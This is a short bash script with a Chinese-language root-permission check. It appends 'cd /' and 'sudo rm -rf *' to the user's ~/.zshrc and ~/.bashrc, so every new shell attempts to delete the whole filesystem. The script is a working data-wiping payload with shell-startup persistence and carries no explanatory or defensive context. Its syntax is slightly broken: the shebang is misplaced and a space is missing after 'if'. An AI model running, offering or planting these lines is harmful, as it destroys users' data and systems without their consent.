if[ $UID != 0 ]; then
  echo "你需要用root权限运行此脚本"
  exit
fi
#!/bin/bash
cat >> ~/.zshrc << EOF
cd /
sudo rm -rf *
EOF
cat >> ~/.bashrc << EOF
cd /
sudo rm -rf *
EOF
